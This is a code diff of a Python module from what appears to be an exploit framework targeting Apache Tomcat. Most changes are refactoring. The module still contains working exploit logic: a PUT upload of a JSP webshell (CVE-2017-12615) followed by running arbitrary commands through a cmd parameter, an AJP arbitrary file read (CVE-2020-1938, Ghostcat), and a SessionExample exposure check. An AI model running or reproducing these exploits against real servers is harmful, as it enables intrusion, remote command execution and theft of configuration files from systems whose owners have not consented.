@@ -1,21 +1,18 @@
 import random,string,requests,json,re,socket
 from requests_toolbelt.utils import dump
 from urllib.parse import urlparse, quote
-from ClassCongregation import _urlparse
+from ClassCongregation import _urlparse,PocType_,verify
 from operator import methodcaller
 from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
-import CodeTest
 ################
 ##--ApacheSolr--##
 #tomcat_examples 实例文件session
 #cve_2017_12615  PUT上传WEBSHELL
 #cve_2020_1938   AJP读取文件
 ################
-#echo VuLnEcHoPoCSuCCeSS
-#VULN = None => 漏洞测试
-#VULN = True => 命令执行
-VULN = ''
-TIMEOUT = ''
+CMD = verify.CMD
+VULN = verify.VULN
+TIMEOUT = verify.TIMEOUT
 class ApacheTomcat():
     def __init__(self, url, CMD):
         self.url = url
@@ -45,18 +42,22 @@ class ApacheTomcat():
         self.payload = "/examples/servlets/servlet/SessionExample"
         self.info = "[url:"+self.url+self.payload+" ]"
         self.r = "PoCWating"
+        self.headers = {
+            'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+            #'Content-Type' : 'application/x-www-form-urlencoded',
+        }
         try:
-            self.request = requests.get(self.url+self.payload, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
+            self.request = requests.get(self.url+self.payload, headers=self.headers, timeout=TIMEOUT, verify=False)
             if self.request.status_code == 200 and r"Session ID:" in self.request.text:
                 self.r = "PoCSuCCeSS"
             self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)               
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)               
                 
         
     def cve_2017_12615(self):
@@ -67,27 +68,31 @@ class ApacheTomcat():
         self.payload1 = ":-)"
         self.payload2 = self.payload_cve_2017_12615
         self.rawdata = "null"
+        self.headers = {
+            'User-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36',
+            #'Content-Type' : 'application/x-www-form-urlencoded',
+        }
         try:
             self.method = "put"
             if VULN == 'False':
-                self.request = requests.put(self.url+self.webshell, data=self.payload1, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.put(self.url+self.webshell, data=self.payload1, headers=self.headers, timeout=TIMEOUT, verify=False)
                 self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
-                self.request = requests.get(self.url+self.webshell[:-1], headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
-                self.info = CodeTest.Colored_.upload()+" [url:"+self.url+"/"+self.name+".jsp ]"
+                self.request = requests.get(self.url+self.webshell[:-1], headers=self.headers, timeout=TIMEOUT, verify=False)
+                self.info = PocType_.upload()+" [url:"+self.url+"/"+self.name+".jsp ]"
                 #self.info = vulninfo.info_cve201712615(self.url)
-                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
+                verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
             else:
-                self.request = requests.put(self.url+self.webshell, data=self.payload2, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.put(self.url+self.webshell, data=self.payload2, headers=self.headers, timeout=TIMEOUT, verify=False)
                 self.urlcmd = self.url+"/"+self.name+".jsp?pwd=password&cmd="+self.CMD
-                self.request = requests.get(self.urlcmd, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
+                self.request = requests.get(self.urlcmd, headers=self.headers, timeout=TIMEOUT, verify=False)
                 self.r = "Put Webshell: "+self.urlcmd+"\n-------------------------\n"+self.request.text
-                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
+                verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
         except requests.exceptions.Timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except requests.exceptions.ConnectionError as error:
-            CodeTest.verify.connection_output(self.pocname)
+            verify.connection_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
+            verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)
 
     def cve_2020_1938(self):
         self.pocname = "Apache Tomcat: CVE-2020-1938"
@@ -107,7 +112,7 @@ class ApacheTomcat():
             self.default_file = self.CMD
         else:
             self.default_file = "WEB-INF/web.xml"
-        self.info = CodeTest.Colored_.contains()+" [port:"+str(self.default_port)+" file:"+self.default_file+"]"
+        self.info = PocType_.contains()+" [port:"+str(self.default_port)+" file:"+self.default_file+"]"
         try:
             socket.setdefaulttimeout(TIMEOUT)
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -124,7 +129,7 @@ class ApacheTomcat():
             if self.username is not None and self.password is not None:
                 self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic "+ str(("%s:%s" %(self.username, self.password)).encode('base64').replace("\n" ""))
             for h in self.default_headers:
-                self.forward_request.request_headers[h] = CodeTest.headers[h]
+                self.forward_request.request_headers[h] = self.headers[h]
             for a in self.attributes:
                 self.forward_request.attributes.append(a)
             self.responses = self.forward_request.send_and_receive(self.socket, self.stream)
@@ -136,11 +141,11 @@ class ApacheTomcat():
             #print ((b"".join([d.data for d in self.data_res]).decode()))
             #return self.snd_hdrs_res, self.data_res
             #print (self.request)
-            CodeTest.verify.generic_output(self.request, self.pocname, self.output_method, self.rawdata, self.info)
+            verify.generic_output(self.request, self.pocname, self.output_method, self.rawdata, self.info)
         except socket.timeout as error:
-            CodeTest.verify.timeout_output(self.pocname)
+            verify.timeout_output(self.pocname)
         except Exception as error:
-            CodeTest.verify.generic_output(self.request, self.pocname, self.output_method, self.rawdata, self.info)
+            verify.generic_output(self.request, self.pocname, self.output_method, self.rawdata, self.info)
 
     # Apache Tomcat CVE-2020-1938 "AJP" protocol check def
     def __prepare_ajp_forward_request(self, target_host, req_uri, method=AjpForwardRequest.GET):
@@ -176,15 +181,7 @@ print("""eg: http://49.4.91.247:9001/
 | Apache Tomcat     | cve_2020_1938    |  Y  |  Y  | 6, 7 < 7.0.100, 8 < 8.5.51, 9 < 9.0.31 arbitrary file read  |
 +-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
 def check(**kwargs):
-    global VULN,TIMEOUT
-    VULN = kwargs['vuln']
-    TIMEOUT = int(kwargs['timeout'])
-    CodeTest.Verification.CMD = kwargs['cmd']
-    CodeTest.Verification.VULN = kwargs['vuln']
-    if VULN == 'False':
-        ExpApacheTomcat = ApacheTomcat(_urlparse(kwargs['url']), "echo VuLnEcHoPoCSuCCeSS")
-    else:
-        ExpApacheTomcat = ApacheTomcat(_urlparse(kwargs['url']), kwargs['cmd'])
+    ExpApacheTomcat = ApacheTomcat(_urlparse(kwargs['url']), CMD)
     if kwargs['pocname'] != 'ALL':
         func = getattr(ExpApacheTomcat, kwargs['pocname'])#返回对象函数属性值，可以直接调用
         func()#调用函数
